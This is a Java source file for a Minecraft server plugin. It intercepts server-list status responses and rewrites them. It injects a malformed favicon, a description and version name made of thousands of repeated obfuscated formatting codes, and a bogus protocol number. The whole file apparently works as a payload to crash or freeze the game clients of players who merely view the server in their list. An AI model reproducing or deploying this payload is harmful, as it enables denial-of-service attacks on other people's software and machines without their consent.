package me.rhys.plugin;

import com.github.retrooper.packetevents.event.PacketListenerAbstract;
import com.github.retrooper.packetevents.event.PacketListenerPriority;
import com.github.retrooper.packetevents.event.PacketSendEvent;
import com.github.retrooper.packetevents.protocol.packettype.PacketType;
import com.github.retrooper.packetevents.wrapper.status.server.WrapperStatusServerResponse;
import com.google.gson.JsonObject;
import com.google.gson.JsonParser;

public class PacketHook extends PacketListenerAbstract {
    private final JsonParser jsonParser = new JsonParser();
    private final String responseMOTD = this.generateString(4020, true);
    private final String protocolName = this.generateString(2020, true);

    public PacketHook() {
        super(PacketListenerPriority.LOWEST);
    }

    @Override
    public void onPacketSend(PacketSendEvent event) {

        if (event.getPacketType() == PacketType.Status.Server.RESPONSE) {
            WrapperStatusServerResponse wrapper = new WrapperStatusServerResponse(event);
            JsonObject jsonObject = this.jsonParser.parse(wrapper.getComponentJson()).getAsJsonObject();

            jsonObject.addProperty("favicon", "data:image/png;base64,\\a\n");

            if (jsonObject.has("description")) {
                jsonObject.addProperty("description", this.responseMOTD);
            }

            if (jsonObject.has("version")) {
                JsonObject version = jsonObject.get("version").getAsJsonObject();

                if (version.has("protocol")) {
                    // force the client to render spigot name
                    version.addProperty("protocol", 999);
                }

                if (version.has("name")) {
                    version.addProperty("name", this.protocolName);
                }
            }

            wrapper.setComponentJson(jsonObject.toString());
        }
    }

    private String generateString(int max, boolean switching) {
        StringBuilder stringBuilder = new StringBuilder();
        boolean b = false;

        for (int i = 0; i < max; i++) {
            if (b) {
                stringBuilder.append("§k§lA");
            } else {
                stringBuilder.append("§k§nA");
            }

            if (switching) {
                b = !b;
            }
        }

        return stringBuilder.toString();
    }
}
